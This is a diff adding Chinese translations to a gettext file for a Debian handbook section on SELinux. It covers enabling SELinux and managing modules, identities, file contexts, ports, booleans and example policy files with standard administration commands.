 msgid "The SELinux system is now ready. To enable it, you should add the <literal>selinux=1</literal> parameter to the Linux kernel. The <literal>audit=1</literal> parameter enables SELinux logging which records all the denied operations. Finally, the <literal>enforcing=1</literal> parameter brings the rules into application: without it SELinux works in its default <emphasis>permissive</emphasis> mode where denied actions are logged but still executed. You should thus modify the GRUB bootloader configuration file to append the desired parameters. One easy way to do this is to modify the <literal>GRUB_CMDLINE_LINUX</literal> variable in <filename>/etc/default/grub</filename> and to run <command>update-grub</command>. SELinux will be active after a reboot."
-msgstr ""
+msgstr "SELinux 系统现在已经准备好了。要给内核添加 <literal>selinux=1</literal> 参数来启用它。<literal>audit=1</literal> 参数会使 SELinux 记录所有被拒绝的操作。<literal>enforcing=1</literal> 参数使规则起作用：不使用该参数的话，SELinux 工作在默认<emphasis>许可</emphasis>模式，该模式下拒绝行为会被记录但是仍然可以执行。可以修改 GRUB 启动加载器的配置文件来附加需要的参数。一个简单的方法是修改 <filename>/etc/default/grub</filename> 文件中的 <literal>GRUB_CMDLINE_LINUX</literal> 变量并运行 <command>update-grub</command>。在重启之后 SELinux 就生效了。"
 
 #. Tag: para
 #, no-c-format
 msgid "It is worth noting that the <command>selinux-activate</command> script automates those operations and forces a labeling on next boot (which avoids new non-labeled files created while SELinux was not yet active and while the labeling was going on)."
-msgstr ""
+msgstr "注意在下次启动时，用 <command>selinux-activate</command> 脚本自动化这些操作并强制标识（避免无标识的文件在 SELinux 未生效或正在标识的时候被创建）。"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing an SELinux System"
-msgstr ""
+msgstr "管理 SELinux 系统"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>semodule</command></primary>"
-msgstr ""
+msgstr "<primary><command>semodule</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>semanage</command></primary>"
-msgstr ""
+msgstr "<primary><command>semanage</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The SELinux policy is a modular set of rules, and its installation detects and enables automatically all the relevant modules based on the already installed services. The system is thus immediately operational. However, when a service is installed after the SELinux policy, you must be able to manually enable the corresponding module. That is the purpose of the <command>semodule</command> command. Furthermore, you must be able to define the roles that each user can endorse, and this can be done with the <command>semanage</command> command."
-msgstr ""
+msgstr "SELinux 策略是一系列的模块化规则集合，安装时它会基于已经安装的服务自动探测并启用相关模块。系统立即可操作。然而，如果一个服务是在 SELinux 策略之后安装的，就要手动启用相应模块了。<command>semodule</command> 命令可以实现该目的。还必须用 <command>semanage</command> 命令，定义每个用户可用的角色。"
 
 #. Tag: para
 #, no-c-format
 msgid "Those two commands can thus be used to modify the current SELinux configuration, which is stored in <filename>/etc/selinux/default/</filename>. Unlike other configuration files that you can find in <filename>/etc/</filename>, all those files must not be changed by hand. You should use the programs designed for this purpose."
-msgstr ""
+msgstr "这两个命令可以用于修改当前 SELinux 存储在 <filename>/etc/selinux/default/</filename> 的配置。不像其他配置文件，可以在 <filename>/etc/</filename> 中的其他配置文件，这些文件不能手工修改。应当使用相应的程序来修改。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>GOING FURTHER</emphasis> More documentation"
-msgstr ""
+msgstr "<emphasis>进阶</emphasis>更多文档"
 
 #. Tag: para
 #, no-c-format
 msgid "Since the NSA doesn't provide any official documentation, the community set up a wiki to compensate. It brings together a lot of information, but you must be aware that most SELinux contributors are Fedora users (where SELinux is enabled by default). The documentation thus tends to deal specifically with that distribution. <ulink type=\"block\" url=\"http://www.selinuxproject.org\" />"
-msgstr ""
+msgstr "由于 NSA 没有提供任何官方文档，社区设置了 wiki 来弥补。里面收集了很多信息，但是要意识到大多数 SELinux 贡献者是 Fedora 用户（其中 SELinux 默认启用）。因此，文档趋于处理该发行版的问题。<ulink type=\"block\" url=\"http://www.selinuxproject.org\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "You should also have a look at the dedicated Debian wiki page as well as Russel Coker's blog, who is one of the most active Debian developers working on SELinux support. <ulink type=\"block\" url=\"http://wiki.debian.org/SELinux\" /> <ulink type=\"block\" url=\"http://etbe.coker.com.au/tag/selinux/\" />"
-msgstr ""
+msgstr "应该看一看 Debian 中专门的 wiki 页面和 Russel Coker 的博客，他是 Debian 上致力于 SELinux 最活跃的开发者。<ulink type=\"block\" url=\"http://wiki.debian.org/SELinux\" /> <ulink type=\"block\" url=\"http://etbe.coker.com.au/tag/selinux/\" />"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing SELinux Modules"
-msgstr ""
+msgstr "管理 SELinux 模块"
 
 #. Tag: para
 #, no-c-format
 msgid "Available SELinux modules are stored in the <filename>/usr/share/selinux/default/</filename> directory. To enable one of these modules in the current configuration, you should use <command>semodule -i <replaceable>module.pp</replaceable></command>. The <emphasis>pp</emphasis> extension stands for <emphasis>policy package</emphasis>."
-msgstr ""
+msgstr "可用的 SELinux 模块存储在 <filename>/usr/share/selinux/default/</filename> 目录。要在当前配置中启用其中的一个模块，使用 <command>semodule -i <replaceable>module.pp</replaceable></command> 命令。<emphasis>pp</emphasis> 扩展名代表 <emphasis>策略软件包－policy package</emphasis>。"
 
 #. Tag: para
 #, no-c-format
 msgid "Removing a module from the current configuration is done with <command>semodule -r <replaceable>module</replaceable></command>. Finally, the <command>semodule -l</command> command lists the modules which are currently enabled. It also outputs their version numbers."
-msgstr ""
+msgstr "从当前配置中移除模块使用 <command>semodule -r <replaceable>module</replaceable></command> 命令。<command>semodule -l</command> 列出当前已经启用的模块清单。同时也输出版本号。"
 
 #. Tag: screen
 #, no-c-format
@@ -1339,31 +1365,42 @@ msgid ""
 "apm     1.7.0\n"
 "[...]</computeroutput>\n"
 msgstr ""
+"<computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/aide.pp</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semodule -l</userinput>\n"
+"<computeroutput>aide    1.4.0\n"
+"apache  1.10.0\n"
+"apm     1.7.0\n"
+"[...]</computeroutput>\n"
+"<computeroutput># </computeroutput><userinput>semodule -r aide</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semodule -l</userinput>\n"
+"<computeroutput>apache  1.10.0\n"
+"apm     1.7.0\n"
+"[...]</computeroutput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>semodule</command> immediately loads the new configuration unless you use its <literal>-n</literal> option. It is worth noting that the program acts by default on the current configuration (which is indicated by the <literal>SELINUXTYPE</literal> variable in <filename>/etc/selinux/config</filename>), but that you can modify another one by specifying it with the <literal>-s</literal> option."
-msgstr ""
+msgstr "<command>semodule</command> 立即加载新配置，除非使用了 <literal>-n</literal> 选项。需要注意的是在当前配置默认启用的程序（由在 <filename>/etc/selinux/config</filename> 文件中的 <literal>SELINUXTYPE</literal> 变量指明），可以使用 <literal>-s</literal> 选项来修改和储存其他的。注意不同版本支持的选项可能不同。"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing Identities"
-msgstr ""
+msgstr "管理身份"
 
 #. Tag: para
 #, no-c-format
 msgid "Every time that a user logs in, they get assigned an SELinux identity. This identity defines the roles that they will be able to endorse. Those two mappings (from the user to the identity and from this identity to roles) are configurable with the <command>semanage</command> command."
-msgstr ""
+msgstr "每次用户登录，就会被赋予一个 SELinux 身份。该身份定义了他们可以使用的角色。这两种映射（从用户到身份，从该身份到角色）使用 <command>semanage</command> 命令配置。"
 
 #. Tag: para
 #, no-c-format
 msgid "You should definitely read the <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry> manual page, even if the command's syntax tends to be similar for all the concepts which are managed. You will find common options to all sub-commands: <literal>-a</literal> to add, <literal>-d</literal> to delete, <literal>-m</literal> to modify, <literal>-l</literal> to list, and <literal>-t</literal> to indicate a type (or domain)."
-msgstr ""
+msgstr "一定要阅读 <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry> 手册页，即使命令语法和所管理的所有概念相似。你会发现所有子命令的通用选项：<literal>-a</literal> 添加，<literal>-d</literal> 删除，<literal>-m</literal> 修改，<literal>-l</literal> 列表，<literal>-t</literal> 指明类型（或域）。"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>semanage login -l</command> lists the current mapping between user identifiers and SELinux identities. Users that have no explicit entry get the identity indicated in the <literal>__default__</literal> entry. The <command>semanage login -a -s user_u <replaceable>user</replaceable></command> command will associate the <emphasis>user_u</emphasis> identity to the given user. Finally, <command>semanage login -d <replaceable>user</replaceable></command> drops the mapping entry assigned to this user."
-msgstr ""
+msgstr "<command>semanage login -l</command> 列出当用户身份和 SELinux 身份之间的映射。没有指明登记项的用户会使用 <literal>__default__</literal> 登记项。 <command>semanage login -a -s user_u <replaceable>user</replaceable></command> 命令会关联 <emphasis>user_u</emphasis> 身份到指定用户。<command>semanage login -d <replaceable>user</replaceable></command> 会移除赋予用户的映射登记项。"
 
 #. Tag: screen
 #, no-c-format
@@ -1379,11 +1416,21 @@ msgid ""
 "system_u                  system_u                  s0-s0:c0.c1023\n"
 "# </computeroutput><userinput>semanage login -d rhertzog</userinput> \n"
 msgstr ""
+"<computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semanage login -l</userinput>\n"
+"<computeroutput>\n"
+"Login Name                SELinux User              MLS/MCS Range\n"
+"\n"
+"__default__               unconfined_u              s0-s0:c0.c1023\n"
+"rhertzog                  user_u                    None\n"
+"root                      unconfined_u              s0-s0:c0.c1023\n"
+"system_u                  system_u                  s0-s0:c0.c1023\n"
+"# </computeroutput><userinput>semanage login -d rhertzog</userinput> \n"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>semanage user -l</command> lists the mapping between SELinux user identities and allowed roles. Adding a new identity requires to define both the corresponding roles and a labeling prefix which is used to assign a type to personal files (<filename>/home/<replaceable>user</replaceable>/*</filename>). The prefix must be picked among <literal>user</literal>, <literal>staff</literal>, and <literal>sysadm</literal>. The “<literal>staff</literal>” prefix results in files of type “<literal>staff_home_dir_t</literal>”. Creating a new SELinux user identity is done with <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> <replaceable>identity</replaceable></command>. Finally, you can remove an SELinux user identity with <command>semanage user -d <replaceable>identity</replaceable></command>."
-msgstr ""
+msgstr "<command>semanage user -l</command> 列出 SELinux 用户身份和允许的角色之间的映射。添加一个新的身份需要定义相应的角色和用于给个人文件赋予类型的标识前缀（<filename>/home/<replaceable>user</replaceable>/*</filename>）。前缀必须从 <literal>user</literal>，<literal>staff</literal>，和 <literal>sysadm</literal> 之间挑选。<literal>staff</literal> 前缀生成 <literal>staff_home_dir_t</literal> 类型文件。创建新的用户身份使用 <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> <replaceable>identity</replaceable></command>。使用 <command>semanage user -d <replaceable>identity</replaceable></command> 移除用户身份。"
 
 #. Tag: screen
 #, no-c-format
@@ -1403,26 +1450,40 @@ msgid ""
 "user_u          user       s0         s0               user_r\n"
 "# </computeroutput><userinput>semanage user -d test_u</userinput>\n"
 msgstr ""
+"<computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semanage user -l</userinput>\n"
+"<computeroutput>\n"
+"                Labeling   MLS/       MLS/\n"
+"SELinux User    Prefix     MCS Level  MCS Range        SELinux Roles\n"
+"\n"
+"root            sysadm     s0         s0-s0:c0.c1023   staff_r sysadm_r system_r\n"
+"staff_u         staff      s0         s0-s0:c0.c1023   staff_r sysadm_r\n"
+"sysadm_u        sysadm     s0         s0-s0:c0.c1023   sysadm_r\n"
+"system_u        user       s0         s0-s0:c0.c1023   system_r\n"
+"test_u          staff      s0         s0               staff_r user_r\n"
+"unconfined_u    unconfined s0         s0-s0:c0.c1023   system_r unconfined_r\n"
+"user_u          user       s0         s0               user_r\n"
+"# </computeroutput><userinput>semanage user -d test_u</userinput>\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing File Contexts, Ports and Booleans"
-msgstr ""
+msgstr "管理文件上下文，端口和布尔值"
 
 #. Tag: para
 #, no-c-format
 msgid "Each SELinux module provides a set of file labeling rules, but it is also possible to add custom labeling rules to cater to a specific case. For example, if you want the web server to be able to read files within the <filename>/srv/www/</filename> file hierarchy, you could execute <command>semanage fcontext -a -t httpd_sys_content_t \"/srv/www(/.*)?\"</command> followed by <command>restorecon -R /srv/www/</command>. The former command registers the new labeling rules and the latter resets the file types according to the current labeling rules."
-msgstr ""
+msgstr "每个 SELinux 模块提供了一套标识规则，但是也可以添加定制的标识规则来满足特殊情况。例如，如果想要网页服务器能读取 <filename>/srv/www/</filename> 里面的文件，就要执行 <command>semanage fcontext -a -t httpd_sys_content_t \"/srv/www(/.*)?\"</command> 和 <command>restorecon -R /srv/www/</command>。前者注册新的标识规则，后者根据当前标识规则重置文件类型。"
 
 #. Tag: para
 #, no-c-format
 msgid "Similarly, TCP/UDP ports are labeled in a way that ensures that only the corresponding daemons can listen to them. For instance, if you want that the web server be able to listen on port 8080, you should run <command>semanage port -m -t http_port_t -p tcp 8080</command>."
-msgstr ""
+msgstr "类似地，TCP/UDP 端口被标识，以确保只有相对应的守护进程可以监听它们。譬如，如果想要网页服务器能监听８０８０端口，就要运行 <command>semanage port -m -t http_port_t -p tcp 8080</command>。"
 
 #. Tag: para
 #, no-c-format
 msgid "Some SELinux modules export boolean options that you can tweak to alter the behavior of the default rules. The <command>getsebool</command> utility can be used to inspect those options (<command>getsebool <replaceable>boolean</replaceable></command> displays one option, and <command>getsebool -a</command> them all). The <command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> command changes the current value of a boolean option. The <literal>-P</literal> option makes the change permanent, it means that the new value becomes the default and will be kept across reboots. The example below grants web servers an access to home directories (this is useful when users have personal websites in <filename>~/public_html/</filename>)."
-msgstr ""
+msgstr "有些 SELinux 模块导出布尔选项，可以用来改变默认规则。<command>getsebool</command> 程序可以用于检查此类选项（<command>getsebool <replaceable>boolean</replaceable></command> 显示一个选项，<command>getsebool -a</command> 显示所有选项）。<command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> 命令改变当前布尔选项值。<literal>-P</literal> 选项使更改永久生效，就意味着新规则成为默认规则，重启之后也会保留。下面的例子授予网页服务器对用户主目录的访问权限（当用户在 <filename>~/public_html/</filename> 中有个人网页的时候，这是很有用的）。"
 
 #. Tag: screen
 #, no-c-format
@@ -1433,21 +1494,26 @@ msgid ""
 "<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> \n"
 "<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>\n"
 msgstr ""
+"<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>\n"
+"<computeroutput>httpd_enable_homedirs --&gt; off\n"
+"# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>\n"
+"<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> \n"
+"<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Adapting the Rules"
-msgstr ""
+msgstr "适应规则"
 
 #. Tag: para
 #, no-c-format
 msgid "Since the SELinux policy is modular, it might be interesting to develop new modules for (possibly custom) applications that lack them. These new modules will then complete the <emphasis>reference policy</emphasis>."
-msgstr ""
+msgstr "既然 SELinux 策略是模块化的，那么为（定制化）新应用开发新模块是很有趣的。这些新模块会完善<emphasis>参考策略</emphasis>。"
 
 #. Tag: para
 #, no-c-format
 msgid "To create new modules, the <emphasis role=\"pkg\">selinux-policy-dev</emphasis> package is required, as well as <emphasis role=\"pkg\">selinux-policy-doc</emphasis>. The latter contains the documentation of the standard rules (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) and sample files that can be used as templates to create new modules. Install those files and study them more closely:"
-msgstr ""
+msgstr "要创建新模块，需要 <emphasis role=\"pkg\">selinux-policy-dev</emphasis> 软件包，还有 <emphasis role=\"pkg\">selinux-policy-doc</emphasis>。后者包含了标准规则的文档（<filename>/usr/share/doc/selinux-policy-doc/html/</filename>）和可用于创建新规则的模板示例文件。安装这些文件并更深入的研究："
 
 #. Tag: screen
 #, no-c-format
@@ -1457,26 +1523,30 @@ msgid ""
 "<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.if.gz &gt;example.if</userinput>\n"
 "<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>\n"
 msgstr ""
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/Makefile.example.gz &gt;Makefile</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.fc.gz &gt;example.fc</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.if.gz &gt;example.if</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "The <filename>.te</filename> file is the most important one. It defines the rules. The <filename>.fc</filename> file defines the “file contexts”, that is the types assigned to files related to this module. The data within the <filename>.fc</filename> file are used during the file labeling step. Finally, the <filename>.if</filename> file defines the interface of the module: it's a set of “public functions” that other modules can use to properly interact with the module that you're creating."
-msgstr ""
+msgstr "<filename>.te</filename> 文件是最重要的一个。它定义规则。<filename>.fc</filename> 文件定义“文件上下文”，即与模块相关的文件被赋予的类型。<filename>.fc</filename> 文件里的数据将在文件标识时使用。<filename>.if</filename> 文件定义了模块接口：它是一套“公用函数”，以便其他模块可以同你所创建的模块交互。"
 
 #. Tag: title
 #, no-c-format
 msgid "Writing a <filename>.fc</filename> file"
-msgstr ""
+msgstr "写一个 <filename>.fc</filename> 文件"
 
 #. Tag: para
 #, no-c-format
 msgid "Reading the below example should be sufficient to understand the structure of such a file. You can use regular expressions to assign the same security context to multiple files, or even an entire directory tree."
-msgstr ""
+msgstr "阅读下面的例子足可以理解此类文件的结构。可以使用正则表达式给多个文件，甚至是整个目录树赋予相同的安全上下文。"
 
 #. Tag: title
 #, no-c-format
 msgid "<filename>example.fc</filename> file"
-msgstr ""
+msgstr "<filename>example.fc</filename> 文件"
 
 #. Tag: programlisting
 #, no-c-format
@@ -1488,26 +1558,32 @@ msgid ""
 "\n"
 "/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)\n"
 msgstr ""
+"# myapp executable will have:\n"
+"# label: system_u:object_r:myapp_exec_t\n"
+"# MLS sensitivity: s0\n"
+"# MCS categories: &lt;none&gt;\n"
+"\n"
+"/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Writing a <filename>.if</filename> File"
-msgstr ""
+msgstr "写一个 <filename>.if</filename> 文件"
 
 #. Tag: para
 #, no-c-format
 msgid "In the sample below, the first interface (“<literal>myapp_domtrans</literal>”) controls who can execute the application. The second one (“<literal>myapp_read_log</literal>”) grants read rights on the application's log files."
-msgstr ""
+msgstr "在下面的例子中，第一个接口（<literal>myapp_domtrans</literal>）控制谁可以执行程序。第二个（<literal>myapp_read_log</literal>）授予程序日志文件的读权限。"
 
 #. Tag: para
 #, no-c-format
 msgid "Each interface must generate a valid set of rules which can be embedded in a <filename>.te</filename> file. You should thus declare all the types that you use (with the <literal>gen_require</literal> macro), and use standard directives to grant rights. Note, however, that you can use interfaces provided by other modules. The next section will give more explanations about how to express those rights."
-msgstr ""
+msgstr "每个接口必须有一套规则并嵌入到 <filename>.te</filename> 文件。因此必须声明所有使用的类型（使用 <literal>gen_require</literal> 宏），并使用标准指令授予权限。也可以使用其他模块提供的接口。如何表示这些权限将在下节给出更详细的解释。"
 
 #. Tag: title
 #, no-c-format
 msgid "<filename>example.if</filename> File"
-msgstr ""
+msgstr "<filename>example.if</filename> 文件"
 
 #. Tag: programlisting
 #, no-c-format
@@ -1563,46 +1639,96 @@ msgid ""
 "        allow $1 myapp_log_t:file r_file_perms;\n"
 "')\n"
 msgstr ""
+"## &lt;summary&gt;Myapp example policy&lt;/summary&gt;\n"
+"## &lt;desc&gt;\n"
+"##      &lt;p&gt;\n"
+"##              More descriptive text about myapp.  The &lt;desc&gt;\n"
+"##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;\n"
+"##              html tags for formatting.\n"
+"##      &lt;/p&gt;\n"
+"##      &lt;p&gt;\n"
+"##              This policy supports the following myapp features:\n"
+"##              &lt;ul&gt;\n"
+"##              &lt;li&gt;Feature A&lt;/li&gt;\n"
+"##              &lt;li&gt;Feature B&lt;/li&gt;\n"
+"##              &lt;li&gt;Feature C&lt;/li&gt;\n"
+"##              &lt;/ul&gt;\n"
+"##      &lt;/p&gt;\n"
+"## &lt;/desc&gt;\n"
+"#\n"
+"\n"
+"########################################\n"
+"## &lt;summary&gt;\n"
+"##      Execute a domain transition to run myapp.\n"
+"## &lt;/summary&gt;\n"
+"## &lt;param name=\"domain\"&gt;\n"
+"##      Domain allowed to transition.\n"
+"## &lt;/param&gt;\n"
+"#\n"
+"interface(`myapp_domtrans',`\n"
+"        gen_require(`\n"
+"                type myapp_t, myapp_exec_t;\n"
+"        ')\n"
+"\n"
+"        domtrans_pattern($1,myapp_exec_t,myapp_t)\n"
+"')\n"
+"\n"
+"########################################\n"
+"## &lt;summary&gt;\n"
+"##      Read myapp log files.\n"
+"## &lt;/summary&gt;\n"
+"## &lt;param name=\"domain\"&gt;\n"
+"##      Domain allowed to read the log files.\n"
+"## &lt;/param&gt;\n"
+"#\n"
+"interface(`myapp_read_log',`\n"
+"        gen_require(`\n"
+"                type myapp_log_t;\n"
+"        ')\n"
+"\n"
+"        logging_search_logs($1)\n"
+"        allow $1 myapp_log_t:file r_file_perms;\n"
+"')\n"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>DOCUMENTATION</emphasis> Explanations about the <emphasis>reference policy</emphasis>"
-msgstr ""
+msgstr "<emphasis>文档</emphasis>关于参考策略的解释"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis>reference policy</emphasis> evolves like any free software project: based on volunteer contributions. The project is hosted by Tresys, one of the most active companies in the SELinux field. Their wiki contains explanations on how the rules are structured and how you can create new ones. <ulink type=\"block\" url=\"http://oss.tresys.com/projects/refpolicy/wiki/GettingStarted\" />"
-msgstr ""
+msgstr "<emphasis>参考策略</emphasis>像其他任何自由软件一样演变：基于志愿者的贡献。该项目有 Tresys 托管，它是在 SELinux 领域最活跃的公司之一。他们的 wiki 页面包含了如何构建规则的解释以及如何创建新规则。<ulink type=\"block\" url=\"http://oss.tresys.com/projects/refpolicy/wiki/GettingStarted\" />"
 
 #. Tag: title
 #, no-c-format
 msgid "Writing a <filename>.te</filename> File"
-msgstr ""
+msgstr "写一个 <filename>.te</filename> 文件"
 
 #. Tag: para
 #, no-c-format
 msgid "Have a look at the <filename>example.te</filename> file:"
-msgstr ""
+msgstr "看一看 <filename>example.te</filename> 文件："
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>GOING FURTHER</emphasis> The <command>m4</command> macro language"
-msgstr ""
+msgstr "<emphasis>进阶</emphasis> <command>m4</command> 宏语言"
 
 #. Tag: para
 #, no-c-format
 msgid "To properly structure the policy, the SELinux developers used a macro-command processor. Instead of duplicating many similar <emphasis>allow</emphasis> directives, they created “macro functions” to use a higher-level logic, which also results in a much more readable policy."
-msgstr ""
+msgstr "要恰当的构建策略，SELinux 开发者使用宏命令处理器。他们创建了“宏功能”，而非重复使用很多相似的<emphasis>允许（allow）</emphasis>指令，来使用高级别的逻辑生成更加可读的策略。"
 
 #. Tag: para
 #, no-c-format
 msgid "In practice, <command>m4</command> is used to compile those rules. It does the opposite operation: it expands all those high-level directives into a huge database of <emphasis>allow</emphasis> directives."
-msgstr ""
+msgstr "实际上，<command>m4</command> 用于编译这些规则。它进行反方向地操作：将所有高级别的逻辑扩展为由<emphasis>允许（allow）</emphasis>指令组成的巨型数据库。"
 
 #. Tag: para
 #, no-c-format
 msgid "The SELinux “interfaces” are only macro functions which will be substituted by a set of rules at compilation time. Likewise, some rights are in fact sets of rights which are replaced by their values at compilation time."
-msgstr ""
+msgstr "SELinux“接口”只是宏功能，在编译时它会被一套规则替代。类似地，有些权限其实是一套权限集合，它们在编译时会被实际值取代。"
 
 #. Tag: programlisting
 #, no-c-format
@@ -1635,456 +1761,483 @@ msgid ""
 "allow myapp_t myapp_tmp_t:file manage_file_perms;\n"
 "files_tmp_filetrans(myapp_t,myapp_tmp_t,file)\n"
 msgstr ""
+"policy_module(myapp,1.0.0) <co id=\"example.te.module\"></co>\n"
+"\n"
+"########################################\n"
+"#\n"
+"# Declarations\n"
+"#\n"
+"\n"
+"type myapp_t; <co id=\"example.te.type\"></co>\n"
+"type myapp_exec_t;\n"
+"domain_type(myapp_t)\n"
+"domain_entry_file(myapp_t, myapp_exec_t) <co id=\"example.te.domain\"></co>\n"
+"\n"
+"type myapp_log_t;\n"
+"logging_log_file(myapp_log_t) <co id=\"example.te.interface\"></co>\n"
+"\n"
+"type myapp_tmp_t;\n"
+"files_tmp_file(myapp_tmp_t)\n"
+"\n"
+"########################################\n"
+"#\n"
+"# Myapp local policy\n"
+"#\n"
+"\n"
+"allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id=\"example.te.allow\"></co>\n"
+"\n"
+"allow myapp_t myapp_tmp_t:file manage_file_perms;\n"
+"files_tmp_filetrans(myapp_t,myapp_tmp_t,file)\n"
 
 #. Tag: para
 #, no-c-format
 msgid "The module must be identified by its name and version number. This directive is required."
-msgstr ""
+msgstr "模块必须通过名字和版本号标识。此指令是必须的。"
 
 #. Tag: para
 #, no-c-format
 msgid "If the module introduces new types, it must declare them with directives like this one. Do not hesitate to create as many types as required rather than granting too many useless rights."
-msgstr ""
+msgstr "如果模块引入了新类型，它们必须使用类似的指令声明。不要害怕需要创建的类型过多，这总胜过赋予过多无用权限。"
 
 #. Tag: para
 #, no-c-format
 msgid "Those interfaces define the <literal>myapp_t</literal> type as a process domain that should be used by any executable labeled with <literal>myapp_exec_t</literal>. Implicitly, this adds an <literal>exec_type</literal> attribute on those objects, which in turn allows other modules to grant rights to execute those programs: for instance, the <literal>userdomain</literal> module allows processes with domains <literal>user_t</literal>, <literal>staff_t</literal>, and <literal>sysadm_t</literal> to execute them. The domains of other confined applications will not have the rights to execute them, unless the rules grant them similar rights (this is the case, for example, of <command>dpkg</command> with its <literal>dpkg_t</literal> domain)."
-msgstr ""
+msgstr "这些接口定义 <literal>myapp_t</literal> 类型为进程域，它可以被标识为 <literal>myapp_exec_t</literal> 的可执行程序使用。这隐式地给这些对象添加 <literal>exec_type</literal> 属性，反过来允许其他模块授予权限执行这些程序：例如，<literal>userdomain</literal> 模块允许具有 <literal>user_t</literal>，<literal>staff_t</literal>，和 <literal>sysadm_t</literal> 域的进程执行。其他受限域将无权运行，除非规则赋予它们类似的权限（在此例中，<command>dpkg</command> 和域 <literal>dpkg_t</literal>）。"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>logging_log_file</literal> is an interface provided by the reference policy. It indicates that files labeled with the given type are log files which ought to benefit from the associated rules (for example granting rights to <command>logrotate</command> so that it can manipulate them)."
-msgstr ""
+msgstr "<literal>logging_log_file</literal> 是一个有参考策略提供的接口。它指明具有某些标识的文件是日志文件并从相关联的规则中获取权限（例如赋予 <command>logrotate</command> 权限，以便于处理它们）。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>allow</literal> directive is the base directive used to authorize an operation. The first parameter is the process domain which is allowed to execute the operation. The second one defines the object that a process of the former domain can manipulate. This parameter is of the form “<replaceable>type</replaceable>:<replaceable>class</replaceable>“ where <replaceable>type</replaceable> is its SELinux type and <replaceable>class</replaceable> describes the nature of the object (file, directory, socket, fifo, etc.). Finally, the last parameter describes the permissions (the allowed operations)."
-msgstr ""
+msgstr "<literal>allow</literal> 指令是授予操作权限的基本指令。第一个参数是允许执行操作的进程域。第二个定义前面的域进程可以操作的对象。参数的形式是：“<replaceable>type</replaceable>:<replaceable>class</replaceable>”此处 <replaceable>type</replaceable> 是 SELinux 类型，<replaceable>class</replaceable> 描述对象（文件，目录，套接字，fifo，等等）属性。最后的参数描述许可权限（即允许的操作）。"
 
 #. Tag: para
 #, no-c-format
 msgid "Permissions are defined as the set of allowed operations and follow this template: <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>. However, you can also use macros representing the most useful permissions. The <filename>/usr/share/selinux/default/include/support/obj_perm_sets.spt</filename> lists them."
-msgstr ""
+msgstr "许可权限由一套允许操作集合组成，并按照这个模板： <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>。可以使用宏来代表最常用的许可。<filename>/usr/share/selinux/default/include/support/obj_perm_sets.spt</filename> 中一一列举。"
 
 #. Tag: para
 #, no-c-format
 msgid "The following web page provides a relatively exhaustive list of object classes, and permissions that can be granted. <ulink type=\"block\" url=\"http://www.selinuxproject.org/page/ObjectClassesPerms\" />"
-msgstr ""
+msgstr "后面的网页提供了一个比较详尽的对象类列表，以及可以授予的权限。<ulink type=\"block\" url=\"http://www.selinuxproject.org/page/ObjectClassesPerms\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "Now you just have to find the minimal set of rules required to ensure that the target application or service works properly. To achieve this, you should have a good knowledge of how the application works and of what kind of data it manages and/or generates."
-msgstr ""
+msgstr "现在需要找到能确保目标程序或服务正常工作的最小规则集合。要做到这一点，就要很好的理解应用程序是如何工作的，它需要处理或生成什么样的数据。"
 
 #. Tag: para
 #, no-c-format
